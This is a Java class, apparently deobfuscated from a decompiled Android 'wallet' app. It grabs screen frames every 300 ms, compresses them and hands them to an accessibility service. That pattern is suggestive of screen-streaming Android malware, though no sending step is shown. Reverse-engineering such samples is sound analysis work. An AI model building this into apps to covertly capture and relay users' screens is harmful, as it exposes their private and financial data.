package com.guard.wallet.capture;

import com.guard.wallet.core.AppUtils;
import android.graphics.Bitmap;
import android.graphics.Bitmap.Config;
import android.media.Image;
import android.media.Image.Plane;
import android.media.ImageReader;
import android.media.ImageReader.OnImageAvailableListener;
import android.util.Log;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.utils.SystemHelper;
import java.nio.ByteBuffer;
import java.util.concurrent.atomic.AtomicLong;
import java.util.concurrent.atomic.AtomicReference;

/**
 * 屏幕图片帧监听器 -- OnImageAvailableListener 实现。
 * 从 ImageReader 获取最新帧，转换为 Bitmap 并经压缩后推送至无障碍服务。
 *
 * vendor 原始路径: x/b.java (66 行)
 */
public final class ScreenImageListener implements OnImageAvailableListener {

    /** 最新一帧 Bitmap（原子引用，线程安全读写） */
    public final AtomicReference<Bitmap> latestBitmap = new AtomicReference<>();
    /** 上次处理时间戳（节流 300ms） */
    public final AtomicLong lastCaptureTime = new AtomicLong(0L);

    @Override
    public final void onImageAvailable(ImageReader reader) {
        Image image = reader.acquireLatestImage();
        if (image != null) {
            long now = System.currentTimeMillis();
            AtomicLong lastTime = this.lastCaptureTime;
            if (now - lastTime.get() > 300L) {
                Bitmap bitmap;
                try {
                    int w = image.getWidth();
                    int h = image.getHeight();
                    Plane[] planes = image.getPlanes();
                    ByteBuffer buffer = planes[0].getBuffer();
                    int pixelStride = planes[0].getPixelStride();
                    bitmap = Bitmap.createBitmap(
                            w + (planes[0].getRowStride() - pixelStride * w) / pixelStride,
                            h, Config.ARGB_8888);
                    bitmap.copyPixelsFromBuffer(buffer);
                } catch (Exception e) {
                    AppUtils.s("BitmapUtils", e);
                    bitmap = null;
                }

                if (bitmap != null) {
                    Log.d("ScreenImageListener", "new Bitmap is Save");
                    AtomicReference<Bitmap> ref = this.latestBitmap;
                    SystemHelper.J0(ref.get());
                    ref.set(bitmap);
                    byte[] compressed = SystemHelper.M0(bitmap, 0.25F, 25);
                    if (MyAccessibilityService.P() != null) {
                        MyAccessibilityService.P().getClass();
                        MyAccessibilityService.a0(compressed);
                    }
                }

                lastTime.set(now);
            }

            image.close();
        }
    }
}
